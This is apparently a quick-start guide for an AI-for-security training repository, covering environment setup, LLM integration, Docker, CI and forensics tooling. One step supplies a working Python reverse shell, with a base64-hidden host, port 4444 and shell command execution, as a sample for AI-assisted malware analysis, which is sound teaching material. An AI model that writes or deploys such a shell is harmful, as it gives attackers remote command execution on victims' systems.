# Quick Start Guide

Get up and running with AI security development in 15 minutes.

---

## ⚡ TL;DR - Fastest Path

```bash
# 1. Clone the repo
git clone https://github.com/depalmar/ai_for_the_win.git
cd ai_for_the_win

# 2. Create Python environment
python -m venv .venv
source .venv/bin/activate  # Windows: .venv\Scripts\activate

# 3. Install dependencies
pip install -r requirements.txt

# 4. Set API key
cp .env.example .env
# Edit .env with your ANTHROPIC_API_KEY

# 5. Test it works
python -c "from anthropic import Anthropic; print('Ready!')"

# 6. Run your first lab
python labs/lab01-phishing-classifier/solution/main.py
```

### 🐳 Docker Quick Start (Alternative)

```bash
# Build and run with Docker Compose
docker-compose up dev

# Run tests in container
docker-compose run test

# Launch Jupyter notebooks
docker-compose up notebook
# Open http://localhost:8888
```

### ☁️ Google Colab (Zero Setup)

Run labs directly in your browser - no local setup required:

| Lab | Open in Colab |
|-----|---------------|
| Lab 01: Phishing Classifier | [![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/depalmar/ai_for_the_win/blob/main/notebooks/lab01_phishing_classifier.ipynb) |
| Lab 02: Malware Clustering | [![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/depalmar/ai_for_the_win/blob/main/notebooks/lab02_malware_clustering.ipynb) |
| All 24 labs available | [Browse notebooks →](../../notebooks/) |

---

## 🎯 Choose Your Path

### Path A: Just Getting Started (Beginner)
Time: 15 minutes

1. Install Cursor IDE
2. Get Anthropic API key
3. Run your first security analysis

### Path B: Full Development Setup (Intermediate)
Time: 30 minutes

1. Complete Python environment
2. All LLM frameworks installed
3. Security tools configured
4. Docker lab ready

### Path C: Production Ready (Advanced)
Time: 1 hour

1. Full development environment
2. CI/CD pipelines
3. MLOps tooling
4. Multi-model support

---

## 🚀 Path A: Quick Start (15 minutes)

### Step 1: Install Cursor IDE (5 min)

1. Download from [cursor.sh](https://cursor.sh)
2. Install and launch
3. Sign in or create account
4. Import VS Code settings if prompted

### Step 2: Get Anthropic API Key (3 min)

1. Go to [console.anthropic.com](https://console.anthropic.com)
2. Create account → Verify email
3. Go to **API Keys** → **Create Key**
4. Copy the key (starts with `sk-ant-`)

### Step 3: Configure Cursor (2 min)

Press `Ctrl+,` (Settings) and add:

```json
{
  "cursor.aiProvider": "anthropic"
}
```

Or use your API key directly in Cursor settings.

### Step 4: Your First Security Analysis (5 min)

1. Create new file `test_analysis.py`
2. Paste this code:

```python
# Suspicious code to analyze
def connect_to_server():
    import socket
    import base64

    host = base64.b64decode("MTkyLjE2OC4xLjE=").decode()
    port = 4444

    s = socket.socket()
    s.connect((host, port))

    while True:
        cmd = s.recv(1024).decode()
        import subprocess
        output = subprocess.check_output(cmd, shell=True)
        s.send(output)
```

3. Select all the code
4. Press `Ctrl+L` (inline chat)
5. Ask: "Analyze this code for malicious behavior and identify the MITRE ATT&CK techniques"

🎉 **You're now doing AI-powered security analysis!**

---

## 🛠️ Path B: Full Development Setup (30 minutes)

### Step 1: Python Environment (5 min)

```bash
# Create project directory
mkdir ai-security-lab && cd ai-security-lab

# Create virtual environment
python -m venv .venv

# Activate
# Linux/Mac:
source .venv/bin/activate
# Windows:
.venv\Scripts\activate

# Upgrade pip
pip install --upgrade pip
```

### Step 2: Install Core Dependencies (5 min)

```bash
# Create requirements.txt
cat << 'EOF' > requirements.txt
# LLM Frameworks
langchain>=0.1.0
langchain-anthropic>=0.1.0
langchain-community>=0.0.10
anthropic>=0.8.0

# Vector Database
chromadb>=0.4.0

# ML Libraries
scikit-learn>=1.3.0
pandas>=2.0.0
numpy>=1.24.0

# Security Tools
yara-python>=4.3.0
pefile>=2023.2.7

# Utilities
python-dotenv>=1.0.0
rich>=13.7.0
httpx>=0.25.0
EOF

# Install
pip install -r requirements.txt
```

### Step 3: Configure Environment (3 min)

```bash
# Create .env file
cat << 'EOF' > .env
ANTHROPIC_API_KEY=sk-ant-your-key-here
OPENAI_API_KEY=sk-your-key-here
LOG_LEVEL=INFO
EOF

# Create .gitignore
cat << 'EOF' > .gitignore
.env
.venv/
__pycache__/
*.pyc
chroma_db/
EOF
```

### Step 4: Create Project Structure (2 min)

```bash
mkdir -p agents config data/{raw,processed} rules/{yara,sigma} scripts tests
touch agents/__init__.py config/__init__.py
```

### Step 5: Test LLM Integration (5 min)

Create `test_setup.py`:

```python
#!/usr/bin/env python3
"""Test the AI security setup."""

from dotenv import load_dotenv
load_dotenv()

from langchain_anthropic import ChatAnthropic
from langchain.prompts import ChatPromptTemplate

# Initialize Claude
llm = ChatAnthropic(model="claude-sonnet-4-20250514")

# Create security analysis prompt
prompt = ChatPromptTemplate.from_template("""
You are a security analyst. Analyze this for threats:

{input}

Provide:
1. Threat assessment
2. IOCs (if any)
3. MITRE ATT&CK mapping
4. Recommendations
""")

# Create chain
chain = prompt | llm

# Test with a sample
result = chain.invoke({
    "input": "User 'admin' logged in from IP 185.143.223.47 at 3:00 AM and executed 'whoami' followed by 'net user'"
})

print(result.content)
print("\n✅ Setup verified! LLM integration working.")
```

Run it:
```bash
python test_setup.py
```

### Step 6: Install Ollama for Local LLMs (5 min)

```bash
# Install Ollama
# Windows: Download from ollama.com
# Mac: brew install ollama
# Linux: curl -fsSL https://ollama.com/install.sh | sh

# Start Ollama
ollama serve

# In another terminal, pull a model
ollama pull llama3.1:8b

# Test local LLM
python -c "
import ollama
response = ollama.chat(model='llama3.1:8b', messages=[
    {'role': 'user', 'content': 'What is a SQL injection?'}
])
print(response['message']['content'][:200])
print('\\n✅ Local LLM working!')
"
```

### Step 7: Docker Lab Environment (5 min)

```bash
# Create docker-compose.yml
cat << 'EOF' > docker-compose.yml
version: '3.8'

services:
  chromadb:
    image: chromadb/chroma:latest
    ports:
      - "8000:8000"
    volumes:
      - chroma_data:/chroma/chroma

  jupyter:
    image: jupyter/scipy-notebook:latest
    ports:
      - "8888:8888"
    volumes:
      - .:/home/jovyan/work
    environment:
      - JUPYTER_ENABLE_LAB=yes

volumes:
  chroma_data:
EOF

# Start services
docker compose up -d

# Check status
docker compose ps
```

🎉 **Full development environment ready!**

---

## 🏭 Path C: Production Setup (1 hour)

Complete Path B first, then continue:

### Additional ML/AI Libraries (10 min)

```bash
pip install \
  torch \
  transformers \
  sentence-transformers \
  mlflow \
  wandb \
  crewai
```

### Pre-commit Hooks (5 min)

```bash
pip install pre-commit

cat << 'EOF' > .pre-commit-config.yaml
repos:
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v4.5.0
    hooks:
      - id: trailing-whitespace
      - id: end-of-file-fixer
      - id: check-yaml
      - id: detect-private-key

  - repo: https://github.com/psf/black
    rev: 23.12.1
    hooks:
      - id: black

  - repo: https://github.com/astral-sh/ruff-pre-commit
    rev: v0.1.9
    hooks:
      - id: ruff

  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.4.0
    hooks:
      - id: detect-secrets
EOF

pre-commit install
```

### GitHub Actions CI/CD (10 min)

```bash
mkdir -p .github/workflows

cat << 'EOF' > .github/workflows/ci.yml
name: CI

on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      - run: pip install -r requirements.txt pytest
      - run: pytest tests/

  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      - run: pip install ruff black
      - run: ruff check .
      - run: black --check .
EOF
```

### Security Scanning (10 min)

```bash
cat << 'EOF' > .github/workflows/security.yml
name: Security

on:
  push:
    branches: [main]
  schedule:
    - cron: '0 0 * * 0'

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install safety bandit
      - run: safety check -r requirements.txt
      - run: bandit -r . -x tests
EOF
```

### Volatility 3 for Memory Forensics (10 min)

```bash
pip install volatility3

# Download symbols
mkdir -p ~/.volatility3/symbols
cd ~/.volatility3/symbols
# Download from https://downloads.volatilityfoundation.org/volatility3/symbols/
```

### YARA Setup (5 min)

```bash
# Install YARA
# Windows: Download from https://github.com/VirusTotal/yara/releases
# Mac: brew install yara
# Linux: sudo apt install yara

# Clone community rules
git clone https://github.com/Yara-Rules/rules.git rules/community-yara
```

### MLOps Configuration (10 min)

```bash
# MLflow setup
mlflow server --host 0.0.0.0 --port 5000 &

# Weights & Biases setup
wandb login

# Test tracking
python -c "
import mlflow
import wandb

mlflow.set_tracking_uri('http://localhost:5000')
mlflow.set_experiment('security-ai')

with mlflow.start_run():
    mlflow.log_param('model', 'claude-sonnet')
    mlflow.log_metric('accuracy', 0.95)
    print('✅ MLflow working!')
"
```

🎉 **Production-ready environment complete!**

---

## 🧪 Verification Checklist

Run these commands to verify your setup:

```bash
echo "=== Checking Python ==="
python --version

echo "=== Checking Core Libraries ==="
python -c "import langchain; print(f'LangChain: {langchain.__version__}')"
python -c "import anthropic; print('Anthropic: OK')"
python -c "import chromadb; print('ChromaDB: OK')"

echo "=== Checking Security Tools ==="
python -c "import yara; print('YARA: OK')" 2>/dev/null || echo "YARA: Not installed"
python -c "import pefile; print('pefile: OK')" 2>/dev/null || echo "pefile: Not installed"

echo "=== Checking Ollama ==="
curl -s http://localhost:11434/api/tags | head -c 100 || echo "Ollama: Not running"

echo "=== Checking Docker ==="
docker --version 2>/dev/null || echo "Docker: Not installed"

echo "=== Checking API Keys ==="
python -c "
import os
from dotenv import load_dotenv
load_dotenv()
if os.getenv('ANTHROPIC_API_KEY'):
    print('Anthropic API Key: Configured')
else:
    print('Anthropic API Key: NOT SET!')
"

echo "=== All checks complete ==="
```

---

## 🎓 Next Steps

After completing setup:

1. **Read the Curriculum**: `docs/ai-security-training-program.md`
2. **Try Lab 1**: Build a phishing classifier
3. **Explore Resources**: `resources/tools-and-resources.md`
4. **Join Communities**: Discord, Reddit, MITRE ATT&CK

---

## ❓ Troubleshooting

### "Module not found" errors
```bash
# Make sure venv is activated
source .venv/bin/activate  # or .venv\Scripts\activate

# Reinstall
pip install -r requirements.txt
```

### API Key errors
```bash
# Check key is set
echo $ANTHROPIC_API_KEY

# Or in Python
python -c "import os; print(os.getenv('ANTHROPIC_API_KEY', 'NOT SET')[:20])"
```

### Ollama not responding
```bash
# Check if running
curl http://localhost:11434/api/tags

# Start it
ollama serve
```

### Docker permission denied
```bash
# Add user to docker group (Linux)
sudo usermod -aG docker $USER
# Log out and back in
```

---

**You're ready to start learning AI for security! 🚀**
